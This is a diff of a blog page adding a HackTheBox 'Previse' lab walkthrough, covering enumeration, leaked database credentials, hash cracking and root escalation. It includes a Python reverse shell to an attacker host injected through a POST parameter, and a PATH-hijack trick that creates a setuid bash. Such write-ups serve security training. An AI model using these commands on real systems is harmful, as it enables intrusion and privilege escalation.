@@ -41,11 +41,104 @@
   &lt;/div&gt;
   &lt;div
     class="hugo-encryptor-cipher-text"
-    data-password="PASSWORD"
+    data-password="23c44ab8465e7ff51a5fab75847e088b"
     style="display: none;"
   &gt;
     &lt;span style="display: none;"&gt;--- DON'T MODIFY THIS LINE ---&lt;/span&gt;
     &lt;h2 id="enumeration"&gt;Enumeration&lt;/h2&gt;
+&lt;h2 id="previse-walkthrough"&gt;Previse walkthrough&lt;/h2&gt;
+&lt;h2 id="enumeration-1"&gt;Enumeration&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;Nmap discovers tcp 22 and 80 ports.&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://previse.htb/login.php"&gt;http://previse.htb/login.php&lt;/a&gt; is a login page. Intercept POST packet with filled parameters to login.php and save it to request.txt.
+Try with SQLi:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;sqlmap -r request.txt -p password 
+&lt;span style="color:#75715e"&gt;# (try with username too)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;No SQLi flaws discovered by sqlmap.&lt;/p&gt;
+&lt;ol start="3"&gt;
+&lt;li&gt;Fuzz the request path.
+wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt &amp;ndash;hc=404 &lt;a href="http://previse.htb"&gt;http://previse.htb&lt;/a&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Interesting files:
+index.php &amp;ndash; 302 Found &amp;ndash;&amp;gt; RESPONSE1 (see below for details)
+login.php
+config.php
+download.php &amp;ndash; 302 &amp;ndash;&amp;gt; login.php
+header.php
+footer.php
+status.php &amp;ndash; 302 &amp;ndash;&amp;gt; MySQL server is running!
+nav.php
+accounts.php &amp;ndash; 302 &amp;ndash;&amp;gt; Create an admin account
+files.php &amp;ndash; 302  &amp;ndash;&amp;gt; backup.zip YEAH!!! Site backups are very welcome!&lt;/p&gt;
+&lt;ol start="4"&gt;
+&lt;li&gt;Intercept request packet with BurpSuite and intercept the response. See annotations above.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).&lt;/p&gt;
+&lt;ol start="5"&gt;
+&lt;li&gt;The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.
+MySQL credentials:
+root
+mySQL_p@ssw0rd!:)
+DBname: previse&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;But we can only access the database from localhost&amp;hellip; Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it&amp;rsquo;s specific to MySQL service.&lt;/p&gt;
+&lt;ol start="6"&gt;
+&lt;li&gt;Revise all files. Look at logs.php. &lt;code&gt;exec()&lt;/code&gt; promises a command injection opportunity.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;The interesting part is here:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-php" data-lang="php"&gt;$output &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;exec&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/usr/bin/python /opt/scripts/log_process.py &lt;/span&gt;&lt;span style="color:#e6db74"&gt;{&lt;/span&gt;$_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;delim&amp;#39;&lt;/span&gt;]&lt;span style="color:#e6db74"&gt;}&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;);
+&lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; $output;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can trigger a reverse shell.&lt;/p&gt;
+&lt;p&gt;Target command: python log_process.py comma;python3 -c &amp;lsquo;import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;ATTACKER_IP&amp;rdquo;,ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/p&gt;
+&lt;p&gt;Change the POST param in Burpsuite:
+delim=comma;python3+-c+&amp;lsquo;import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;ldquo;10.0.0.1&amp;rdquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;rsquo;&lt;/p&gt;
+&lt;ol start="7"&gt;
+&lt;li&gt;To escalate from a www-data account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;mysql -u root -p
+Enter password: mySQL_p@ssw0rd!:&lt;span style="color:#f92672"&gt;)&lt;/span&gt;
+
+&amp;gt; use previse;
+&amp;gt; show tables;  &lt;span style="color:#75715e"&gt;# accounts and files&lt;/span&gt;
+&amp;gt; &lt;span style="color:#66d9ef"&gt;select&lt;/span&gt; * from accounts;
+&lt;span style="color:#75715e"&gt;# columns id, username, password and created_at&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, the username is &lt;code&gt;m4lwhere&lt;/code&gt; and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;hashcat -a &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt; -m &lt;span style="color:#ae81ff"&gt;500&lt;/span&gt; hash.txt --wordlist&lt;span style="color:#f92672"&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Same but with &amp;ndash;show&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;username = m4lwhere
+hash = $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+password = ilovecody112235!
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that john doesn&amp;rsquo;t support non-printable characters in hash.&lt;/p&gt;
+&lt;ol start="8"&gt;
+&lt;li&gt;SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id="privilege-escalation"&gt;Privilege escalation&lt;/h2&gt;
+&lt;ol start="9"&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;sudo -l&lt;/code&gt; reveals the script &lt;code&gt;/opt/scripts/access_backup.sh&lt;/code&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Copy to local machine:&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By looking at this file, we find command path vulnerability.&lt;/p&gt;
+&lt;ol start="11"&gt;
+&lt;li&gt;We can put a script named &lt;code&gt;gzip&lt;/code&gt; in the current workdir and execute &lt;code&gt;access_backup.sh&lt;/code&gt; as root.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;cd /tmp
+&lt;span style="color:#75715e"&gt;# set gzip to be bash with setuid bit&lt;/span&gt;
+cat &lt;span style="color:#e6db74"&gt;&amp;lt;&amp;lt; EOF &amp;gt; gzip 
+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;#!/bin/bash
+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;cp /bin/bash /tmp/c
+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;chmod u+s /tmp/c
+&lt;/span&gt;&lt;span style="color:#e6db74"&gt;EOF&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start="12"&gt;
+&lt;li&gt;Now &lt;code&gt;/tmp/c&lt;/code&gt; is a setuid bash.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"&gt;&lt;code class="language-sh" data-lang="sh"&gt;/tmp/c -p &lt;span style="color:#f92672"&gt;(&lt;/span&gt;this flag sets the real userid as the effective userid&lt;span style="color:#f92672"&gt;)&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;root.txt: 23c44ab8465e7ff51a5fab75847e088b&lt;/p&gt;
 
   &lt;/div&gt;
 &lt;/div&gt;</content>
